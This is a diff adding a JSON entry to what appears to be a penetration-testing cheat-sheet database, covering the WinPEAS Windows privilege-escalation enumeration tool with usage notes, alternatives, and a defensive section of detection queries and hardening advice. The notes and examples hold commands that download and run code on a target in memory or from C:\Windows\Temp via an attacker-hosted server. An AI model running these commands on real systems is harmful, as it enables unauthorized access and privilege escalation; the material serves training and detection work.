@@ -1,0 +1,106 @@
+{
+  "id": "winpeas-enum",
+  "name": "WinPEAS - Windows Privilege Escalation Enumeration",
+  "command": "winPEASx64.exe",
+  "description": "WinPEAS is the de-facto Windows privilege escalation enumeration tool. It audits the host for privesc vectors - unquoted service paths, weak service/registry permissions, AlwaysInstallElevated, token privileges (SeImpersonate etc.), stored credentials, scheduled tasks, DPAPI, autologon, and known kernel/CVE indicators - and highlights likely findings in color. First tool to run after landing a Windows shell.",
+  "platform": "windows",
+  "type": "command",
+  "opsec": "loud",
+  "category": "Post-Exploitation",
+  "subcategory": "Privilege Escalation",
+  "certifications": [
+    "OSCP",
+    "CPTS"
+  ],
+  "primary_cert": "OSCP",
+  "source": "peass-ng/PEASS-ng",
+  "tags": [
+    "winpeas",
+    "privesc",
+    "enumeration",
+    "peass",
+    "windows",
+    "services",
+    "tokens",
+    "automation"
+  ],
+  "mitre": [
+    "T1082",
+    "T1083"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== EXE (full, best output) ===\n  winPEASx64.exe\n  winPEASx86.exe\n  winPEASx64.exe quiet cmd fast     # quiet banner, cmd checks, fast mode\n  winPEASx64.exe log=winpeas.txt    # save output\n\n=== BAT (no .NET needed) ===\n  winPEAS.bat\n\n=== PS1 / FILELESS ===\n  # Download + run in memory:\n  iex (New-Object Net.WebClient).DownloadString(\"http://<lhost>/winPEAS.ps1\")\n\n=== TRANSFER FIRST (no egress) ===\n  # Attacker:\n  python3 -m http.server 80\n  # Target (PowerShell):\n  iwr http://<lhost>/winPEASx64.exe -OutFile C:\\Windows\\Temp\\wp.exe; C:\\Windows\\Temp\\wp.exe\n\n=== USEFUL ARGS ===\n  fast          # skip slow checks\n  searchall     # search all drives for sensitive files\n  cmd           # run cmd-based checks\n  systeminfo / userinfo / servicesinfo / applicationsinfo / windowscreds\n\n=== READING RESULTS ===\n  # RED = likely exploitable; GREEN = defense/good config\n  # Focus on: service misconfigs, SeImpersonate/SeBackup/etc privileges,\n  #   AlwaysInstallElevated, unquoted paths, stored creds, autologon\n\n=== ALTERNATIVES / COMPLEMENTS ===\n  PrivescCheck.ps1   # PowerShell, AV-friendly\n  Seatbelt.exe       # C# situational awareness\n  PowerUp.ps1        # service-focused + auto-exploit\n  wesng / Watson     # kernel CVE matching\n  # Verify findings manually (accesschk, sc qc, icacls)",
+  "examples": [
+    {
+      "label": "Full EXE enumeration",
+      "command": "winPEASx64.exe quiet cmd fast log=winpeas.txt"
+    },
+    {
+      "label": "Fileless PS1 via memory",
+      "command": "iex (New-Object Net.WebClient).DownloadString(\"http://10.10.14.5/winPEAS.ps1\")"
+    },
+    {
+      "label": "Transfer and run",
+      "command": "iwr http://10.10.14.5/winPEASx64.exe -OutFile C:\\Windows\\Temp\\wp.exe; C:\\Windows\\Temp\\wp.exe"
+    }
+  ],
+  "references": [
+    {
+      "title": "PEASS-ng",
+      "url": "https://github.com/peass-ng/PEASS-ng"
+    },
+    {
+      "title": "MITRE T1082 - System Information Discovery",
+      "url": "https://attack.mitre.org/techniques/T1082/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "privesc-privesccheck",
+      "note": "PrivescCheck is the AV-friendly PowerShell alternative.",
+      "rel": "alternative"
+    },
+    {
+      "id": "sharpup-audit",
+      "note": "SharpUp/PowerUp auto-exploit service misconfigs WinPEAS finds.",
+      "rel": "next"
+    },
+    {
+      "id": "privesc-wesng",
+      "note": "Match systeminfo to missing patches/CVEs.",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "why_it_works": "WinPEAS queries normal, user-readable Windows state (services, registry, ACLs, privileges, environment). It is noisy but uses standard APIs, so it runs reliably even as a low-priv user.",
+    "prerequisites": "Any shell on the target; appropriate WinPEAS variant (exe/bat/ps1).",
+    "impact": "Comprehensive mapping of every local Windows privesc vector in one pass.",
+    "detection": "[MITRE T1082/T1083] winpeas binary signatures (EDR/AV flag it by default); burst of sc query/reg query/whoami /priv/icacls/accesschk; mass registry and ACL enumeration.",
+    "artifacts": "winPEAS*.exe/bat/ps1 on disk; AMSI/Defender detections; 4688 process-creation spikes of enumeration utilities.",
+    "splunk_spl": "index=windows EventCode=4688 (NewProcessName=\"*winPEAS*\" OR CommandLine=\"*winpeas*\" OR CommandLine=\"*accesschk*\")\n| table _time, SubjectUserName, NewProcessName, CommandLine",
+    "elastic_kql": "process.name:*winPEAS* or process.command_line:(*winpeas* or *accesschk*)",
+    "sentinel_kql": "DeviceProcessEvents\n| where FileName has \"winPEAS\" or ProcessCommandLine has \"winpeas\"\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine",
+    "sigma_rules": "win_privesc_enumeration_winpeas",
+    "prevention": "Harden services (quoted paths, strong ACLs), disable AlwaysInstallElevated, remove dangerous token privileges from non-admins, store no plaintext creds, keep patched; EDR/AV signatures catch winpeas by default; ASR + attack-surface reduction.",
+    "sources": [
+      "PEASS-ng",
+      "https://attack.mitre.org/techniques/T1082/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "WinPEAS / privesc enumeration execution",
+        "logic": "DeviceProcessEvents\n| where FileName has_any (\"winPEAS\",\"winPEASx64\",\"winPEASx86\") or ProcessCommandLine has \"winpeas\"\n  or (FileName == \"accesschk.exe\" and ProcessCommandLine has_any (\"-uwcqv\",\"-accepteula\"))\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine",
+        "data_source": "defender-endpoint",
+        "attack": [
+          "T1082",
+          "T1083"
+        ],
+        "fidelity": "signature",
+        "confidence": "high",
+        "false_positives": "Authorized security assessments",
+        "tuning": "Renamed binaries evade name match - also alert on rapid sc/reg/whoami enumeration bursts"
+      }
+    ]
+  }
+}
